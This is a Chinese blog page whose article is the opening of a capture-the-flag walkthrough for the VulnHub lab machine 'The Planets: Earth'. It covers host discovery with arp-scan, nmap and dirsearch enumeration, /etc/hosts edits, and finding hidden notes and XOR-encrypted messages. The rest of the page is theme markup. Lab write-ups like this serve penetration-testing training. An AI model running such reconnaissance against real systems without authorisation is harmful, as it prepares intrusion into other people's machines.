@@ -1,0 +1,2038 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>vulnhub靶机The Planets: Earth - Happ3n</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<link rel="shortcut icon" href="/images/head/head.jpg" type="image/jpg" />
+<meta name="description" content="vulnhub靶机The Planets: Earth先下载靶机https:&#x2F;&#x2F;download.vulnhub.com&#x2F;theplanets&#x2F;Earth.ova 在vm上直接打开，先找到mac地址  在kali上用命令先进行扫描，找到网页ip 1arp-scan -l            &#x2F;&#x2F;可以查看所有的选项，可以扫描本地所有存活主机，扫描出ip   得到ip先用nmap扫描一下端口  看见">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机The Planets: Earth">
+<meta property="og:url" content="https://itwillhappen.github.io/2024/12/06/vulnhub-%E9%9D%B6%E6%9C%BA-ThePlanetsEarth/index.html">
+<meta property="og:site_name" content="Happ3n">
+<meta property="og:description" content="vulnhub靶机The Planets: Earth先下载靶机https:&#x2F;&#x2F;download.vulnhub.com&#x2F;theplanets&#x2F;Earth.ova 在vm上直接打开，先找到mac地址  在kali上用命令先进行扫描，找到网页ip 1arp-scan -l            &#x2F;&#x2F;可以查看所有的选项，可以扫描本地所有存活主机，扫描出ip   得到ip先用nmap扫描一下端口  看见">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116135213232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116135356144.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116140648346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118193051845.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118193827625.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118202705914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118210058920.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118210752538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118211618109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118212715638.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119204457789.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119215551441.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241119215956610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241120103304813.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241120112345063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121200641890.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121202348577.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121203432036.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121204123361.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121214814724.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215040000.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215603323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121215951124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241121220634647.png">
+<meta property="article:published_time" content="2024-12-06T16:40:12.000Z">
+<meta property="article:modified_time" content="2024-12-08T18:04:34.000Z">
+<meta property="article:author" content="Happ3n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116135213232.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1773566656273">
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_2421060_8z08qcz5sq3.css">
+
+<link rel="stylesheet" href="/css/style.css?v=1773566656273">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1773566656273">
+    
+        <link rel="stylesheet" href="/themes/umaru/index.css?v=1773566656273">
+    
+        <link rel="stylesheet" href="/themes/asuka/index.css?v=1773566656273">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1773566656274"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1Z7TFL96ZH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1Z7TFL96ZH');
+</script>
+<script src="https://unpkg.com/hexo-shiki-plugin@1.0.27/lib/codeblock.js"></script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.svipaigc.com/bizi/2024/01/013249-170127916952c1.jpg)"></div><div class="nexmoe-character"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon nexmoe-avatar" href="/" title="Happ3n"><img src="/images/head/head.jpg" alt="Happ3n"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Happ3n">
+            <img src="/images/head/head.jpg" alt="Happ3n" alt="Happ3n">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div class="nexmoe-count-item"><span>文章</span>6 <div class="item-radius"></div><div class="item-radius item-right"></div> </div>
+        <div class="nexmoe-count-item"><span>标签</span>0<div class="item-radius"></div><div class="item-radius item-right"></div></div>
+        <div class="nexmoe-count-item"><span>分类</span>0<div class="item-radius"></div><div class="item-radius item-right"></div></div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-meishi"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-hanbao1"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于糖糖">
+            <i class="mdui-list-item-icon nexmoefont icon-jiubei1"></i>
+            <div class="mdui-list-item-content">
+                关于糖糖
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/friend.html" title="大伙伴们">
+            <i class="mdui-list-item-icon nexmoefont icon-cola"></i>
+            <div class="mdui-list-item-content">
+                大伙伴们
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/memos.html" title="小朋友圈">
+            <i class="mdui-list-item-icon nexmoefont icon-tangguo"></i>
+            <div class="mdui-list-item-content">
+                小朋友圈
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap" style="background: transparent;box-shadow: none;">
+    <div class="nexmoe-widget nexmoe-switch-theme">
+        <div class="theme-toggle-container" onclick="useToggle()">
+            <!-- 背景元素 -->
+            <div class="toggle-background">
+                <!-- 白云 -->
+                <div class="clouds">
+                    <div class="cloud cloud1"></div>
+                    <div class="cloud cloud2"></div>
+                    <div class="cloud cloud3"></div>
+                </div>
+                <!-- 星空 -->
+                <div class="stars">
+                    <div class="star star1"></div>
+                    <div class="star star2"></div>
+                    <div class="star star3"></div>
+                    <div class="star star4"></div>
+                    <div class="star star5"></div>
+                </div>
+            </div>
+            <!-- 太阳/月亮滑块 -->
+            <div class="theme-slider">
+                <svg class="theme-icon sun" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="5" fill="#ffd700"/>
+                    <path d="M12 1V3M12 21V23M4.22 4.22L5.64 5.64M18.36 18.36L19.78 19.78M1 12H3M21 12H23M4.22 19.78L5.64 18.36M18.36 5.64L19.78 4.22" stroke="#ffd700" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                <svg class="theme-icon moon" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+</div>
+<style>
+    /* 主题切换过渡动画 */
+    ::view-transition-group(root) {
+        animation-duration: 0.7s;
+        animation-timing-function: var(--expo-out);
+    }
+
+    ::view-transition-new(root) {
+        animation-name: reveal-light;
+        animation-fill-mode: both;
+    }
+
+    ::view-transition-old(root),
+    [data-theme="dark"]::view-transition-old(root) {
+        animation: none;
+        animation-fill-mode: both;
+        z-index: -1;
+    }
+
+    [data-theme="dark"]::view-transition-new(root) {
+        animation-name: reveal-dark;
+        animation-fill-mode: both;
+    }
+
+    @keyframes reveal-dark {
+        from {
+            clip-path: polygon(50% -71%, -50% 71%, -50% 71%, 50% -71%);
+        }
+
+        to {
+            clip-path: polygon(50% -71%, -50% 71%, 50% 171%, 171% 50%);
+        }
+    }
+
+    @keyframes reveal-light {
+        from {
+            clip-path: polygon(171% 50%, 50% 171%, 50% 171%, 171% 50%);
+        }
+
+        to {
+            clip-path: polygon(171% 50%, 50% 171%, -50% 71%, 50% -71%);
+        }
+    }
+
+    /* 主题切换矩形样式 */
+    .nexmoe-switch-theme {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .theme-toggle-container {
+        position: relative;
+        width: inherit;
+        height: 70px;
+        background: linear-gradient(135deg, #87CEEB 0%, #E0F7FA 100%);
+        border-radius: 35px;
+        cursor: pointer;
+        overflow: hidden;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        transform: scale(0.8);
+    }
+
+    /* 深色主题下的背景 */
+    [data-theme="dark"] .theme-toggle-container {
+        background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%);
+    }
+
+    /* 背景元素容器 */
+    .toggle-background {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        overflow: hidden;
+    }
+
+    /* 白云样式 */
+    .clouds {
+        position: absolute;
+        left: 70%;
+        top: 50%;
+        transform: translateY(-50%);
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    [data-theme="dark"] .clouds {
+        opacity: 0;
+        right: -50px;
+    }
+
+    .cloud {
+        position: absolute;
+        background: white;
+        border-radius: 50px;
+        opacity: 0.8;
+        animation: cloudFloat 4s ease-in-out infinite;
+    }
+
+    .cloud1 {
+        width: 30px;
+        height: 20px;
+        top: 0;
+        left: 0;
+    }
+
+    .cloud2 {
+        width: 25px;
+        height: 15px;
+        top: 25px;
+        left: 10px;
+        animation-delay: 1s;
+    }
+
+    .cloud3 {
+        width: 20px;
+        height: 15px;
+        top: 10px;
+        left: 35px;
+        animation-delay: 2s;
+    }
+
+    /* 云朵浮动动画 */
+    @keyframes cloudFloat {
+        0%, 100% {
+            transform: translateY(0) rotate(0deg);
+        }
+        50% {
+            transform: translateY(-5px) rotate(2deg);
+        }
+    }
+
+    /* 星空样式 */
+    .stars {
+        position: absolute;
+        left: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        opacity: 0;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    [data-theme="dark"] .stars {
+        opacity: 1;
+    }
+
+    .star {
+        position: absolute;
+        background: white;
+        border-radius: 50%;
+        animation: starTwinkle 2s ease-in-out infinite;
+    }
+
+    .star1 {
+        width: 3px;
+        height: 3px;
+        top: 0;
+        left: 0;
+    }
+
+    .star2 {
+        width: 2px;
+        height: 2px;
+        top: 20px;
+        left: 25px;
+        animation-delay: 0.5s;
+    }
+
+    .star3 {
+        width: 4px;
+        height: 4px;
+        top: 10px;
+        left: 50px;
+        animation-delay: 1s;
+    }
+
+    .star4 {
+        width: 2px;
+        height: 2px;
+        top: 30px;
+        left: 35px;
+        animation-delay: 1.5s;
+    }
+
+    .star5 {
+        width: 3px;
+        height: 3px;
+        top: 15px;
+        left: 15px;
+        animation-delay: 2s;
+    }
+
+    /* 星星闪烁动画 */
+    @keyframes starTwinkle {
+        0%, 100% {
+            opacity: 0.3;
+            transform: scale(1);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+            filter: drop-shadow(0 0 3px white);
+        }
+    }
+
+    /* 太阳/月亮滑块 */
+    .theme-slider {
+        position: absolute;
+        left: 5px;
+        top: 5px;
+        width: 60px;
+        height: 60px;
+        background: white;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        z-index: 1;
+    }
+
+    [data-theme="dark"] .theme-slider {
+        left: calc(100% - 60px - 5px);
+        background: #f0f0f0;
+    }
+
+    /* 太阳和月亮图标 */
+    .theme-icon {
+        position: absolute;
+        transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .sun {
+        opacity: 1;
+        transform: scale(1) rotate(0deg);
+    }
+
+    .moon {
+        opacity: 0;
+        transform: scale(0.8) rotate(-90deg);
+    }
+
+    [data-theme="dark"] .sun {
+        opacity: 0;
+        transform: scale(0.8) rotate(90deg);
+    }
+
+    [data-theme="dark"] .moon {
+        opacity: 1;
+        transform: scale(1) rotate(0deg);
+    }
+
+    /* 太阳和月亮的发光效果 */
+    @keyframes sunPulse {
+        0%, 100% {
+            filter: drop-shadow(0 0 6px #ffd700);
+        }
+        50% {
+            filter: drop-shadow(0 0 12px #ffd700) drop-shadow(0 0 18px rgba(255, 215, 0, 0.7));
+        }
+    }
+
+    @keyframes moonGlow {
+        0%, 100% {
+            filter: drop-shadow(0 0 4px #e0e7ff);
+        }
+        50% {
+            filter: drop-shadow(0 0 8px #e0e7ff) drop-shadow(0 0 12px rgba(224, 231, 255, 0.7));
+        }
+    }
+
+    /* 应用发光动画 */
+    .sun {
+        animation: sunPulse 3s ease-in-out infinite;
+    }
+
+    .moon {
+        animation: moonGlow 3s ease-in-out infinite;
+    }
+
+    /* 鼠标悬停效果 */
+    .theme-toggle-container:hover {
+        transform: scale(0.9);
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    /* 点击效果 */
+    .theme-toggle-container:active {
+        transform: scale(0.98);
+    }
+</style>
+<script>
+    const localTheme = typeof localStorage !== "undefined" && localStorage.getItem("hexo-theme")
+    let theme = localTheme || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light")
+    document.documentElement.setAttribute("data-theme", theme)
+
+    function switchTheme() {
+        theme = theme === "dark" ? "light" : "dark"
+        document.documentElement.setAttribute("data-theme", theme)
+        localStorage.setItem("hexo-theme", theme)
+    }
+
+    function useToggle() {
+        const isAppearanceTransition = document.startViewTransition && !window.matchMedia("(prefers-reduced-motion: reduce)").matches
+        if (!isAppearanceTransition) switchTheme()
+        document.startViewTransition(switchTheme)
+    }
+</script>
+    
+        
+        <div style="position: relative;">
+    <div class="nexmoe-widget-wrap">
+        <div class="nexmoe-widget nexmoe-search">
+            
+                    <form id="search_form">
+                        <label><input oninput="sinput()" class="st-default-search-input search-input"
+                                style="color:var(--color-text-2);" id="search_value" name="q" type="search"
+                                placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+                    </form>
+                    
+        </div>
+    </div>
+
+    <div class="search-body">
+
+    </div>
+</div>
+<style>
+    .search-body {
+        position: absolute;
+        width: calc(100% - 40px);
+        margin: 0 20px;
+        box-sizing: border-box;
+        top: 60px;
+        right: 0;
+        background-color: var(--color-card);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        z-index: 1000;
+        max-height: 300px;
+        overflow-y: auto;
+        overflow-x: hidden;
+        color: var(--color-text-1);
+        border-radius: 12px;
+    }
+    .search-body a {
+        color: var(--color-text-1);
+    }
+    .search-body .keyword {
+        font-weight: bold;
+        color: var(--color-primary);
+    }
+    .search-result {
+       padding: 10px 20px;
+       border-bottom: 1px dashed var(--color-primary);
+       cursor: pointer;
+    }
+
+    .search-result-title {
+        font-size: 16px;
+        font-weight: bold;
+        white-space: nowrap;
+        /* 防止文本换行 */
+        overflow: hidden;
+        /* 隐藏溢出的内容 */
+        text-overflow: ellipsis;
+        /* 显示省略号来代表被修剪的文本 */
+    }
+
+    .search-result-text {
+        font-size: 14px;
+        white-space: nowrap;
+        /* 防止文本换行 */
+        overflow: hidden;
+        /* 隐藏溢出的内容 */
+        text-overflow: ellipsis;
+        /* 显示省略号来代表被修剪的文本 */
+    }
+    
+</style>
+
+
+    <script async src="/js/search.js?v=1773566656274"></script>
+        
+
+            
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="http://wpa.qq.com/msgrd?v=3&uin=2120252100&site=qq&menu=yes"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ'}"
+			style="
+				color: rgb(64, 196, 255);
+				background-color: rgba(64, 196, 255, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="mailto:tangyuxian@vip.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'mail'}"
+			style="
+				color: rgb(249,8,8);
+				background-color: rgba(249,8,8,.1);
+			"
+		>
+			<i
+				class="nexmoefont icon-mail-fill"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/qq_40621378?type=blog"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(199,29,35);
+				background-color: rgba(199,29,35,.1);
+			"
+		>
+			<i
+				class="nexmoefont icon-csdn"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.cnblogs.com/lovetangyuxian/"
+			target="_blank"
+			mdui-tooltip="{content: '博客园'}"
+			style="
+				color: rgb(66, 214, 29);
+				background-color: rgba(66, 214, 29, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bokeyuan"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/tangyuxian/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .15);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://gitee.com/tangyuxian"
+			target="_blank"
+			mdui-tooltip="{content: 'gitee'}"
+			style="
+				color: rgb(255, 255, 255);
+				background-color: rgb(199,29,35);
+			"
+		>
+			<i
+				class="nexmoefont icon-mayun"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/11/CVE-2025-6218-%E5%A4%8D%E7%8E%B0/">CVE-2025-6218复现</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/13/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/09/%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E5%9F%BA%E4%BA%8E-stowaway/">多级代理（基于stowaway）</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/06/vulnhub-%E9%9D%B6%E6%9C%BA-ThePlanetsEarth/">vulnhub靶机The Planets: Earth</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://memos.tangyuxian.com/" target="_blank" >
+                    <img src="https://cdn.tangyuxian.com/PicGoImages/202304272004917.jpg" alt="糖糖的闺中小秘密"></img>
+                    <p style="color: var(--color-primary)">糖糖的闺中小秘密</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2026 Happ3n
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/tangyuxian/hexo-theme-tangyuxian" target="_blank">Tangyuxian</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">辽ICP备2021002341号</a>
+<div style="font-size: 12px">
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+   本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br />
+   本站访客数<a id="busuanzi_value_site_uv"></a>人次
+</div>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover">
+            <img src="https://cdn.svipaigc.com/bizi/2024/01/013249-170127916952c1.jpg" alt="vulnhub靶机The Planets: Earth" loading="lazy">
+            <h1>vulnhub靶机The Planets: Earth</h1>
+        </div>
+        
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年12月06日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="vulnhub靶机The-Planets-Earth"><a href="#vulnhub靶机The-Planets-Earth" class="headerlink" title="vulnhub靶机The Planets: Earth"></a>vulnhub靶机The Planets: Earth</h1><p>先下载靶机<a target="_blank" rel="noopener" href="https://download.vulnhub.com/theplanets/Earth.ova">https://download.vulnhub.com/theplanets/Earth.ova</a></p>
+<p>在vm上直接打开，先找到mac地址</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116135213232.png" alt="image-20241116135213232" data-caption="image-20241116135213232" loading="lazy"></p>
+<p>在kali上用命令先进行扫描，找到网页ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l            //可以查看所有的选项，可以扫描本地所有存活主机，扫描出ip</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116135356144.png" alt="image-20241116135356144" data-caption="image-20241116135356144" loading="lazy"></p>
+<p>得到ip先用nmap扫描一下端口</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241116140648346.png" alt="image-20241116140648346" data-caption="image-20241116140648346" loading="lazy"></p>
+<p>看见了DNS:earth.local, DNS:terratest.earth.local</p>
+<p>向&#x2F;etc&#x2F;hosts中添加earth.local与terratest.earth.local</p>
+<p>其中&#x2F;etc&#x2F;hosts用于映射主机名和ip，它允许将特定的主机名映射到指定的IP地址，从而绕过DNS解析过程</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118193051845.png" alt="image-20241118193051845" data-caption="image-20241118193051845" loading="lazy"></p>
+<p>用kali的火狐将earth.local页面打开，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118193827625.png" alt="image-20241118193827625" data-caption="image-20241118193827625" loading="lazy"></p>
+<p>里面有Previous Messages:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+
+<p>但是不知道是什么，若发送信息，就会在Previous Messages中存入所输入的信息；</p>
+<p>再进行别的信息搜集，用dirsearch进行目录扫描，找到一个&#x2F;admin路径，点击log in，进入到&#x2F;admin&#x2F;login页面</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118202705914.png" alt="image-20241118202705914" data-caption="image-20241118202705914" loading="lazy"></p>
+<p>一个登录界面，但是有固定的账户密码，登不进，于是再到另一个terratest.earth.local页面搜集信息，打开是与earth.local类似的页面，也没有什么信息，于是也进行扫描</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118210058920.png" alt="image-20241118210058920" data-caption="image-20241118210058920" loading="lazy"></p>
+<p>发现了robots协议，访问一下看看，一开始发现访问不了，发现要改为https才能访问，访问后得到一堆路径</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118210752538.png" alt="image-20241118210752538" data-caption="image-20241118210752538" loading="lazy"></p>
+<p>一个一个试了一些后发现都没有内容，且只有最后一个有文件名，于是猜想会不会是给文件名加上后缀，一个一个试后缀，在<a target="_blank" rel="noopener" href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a>路径下发现了内容</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20241118211618109.png" alt="image-20241118211618109" data-caption="image-20241118211618109" loading="lazy"></p>
+<p>翻译后告诉信息：</p>
+<p>使用了XOR算法进行加密，</p>
+<p>并且曾经testdata.txt 用于测试加密，</p>
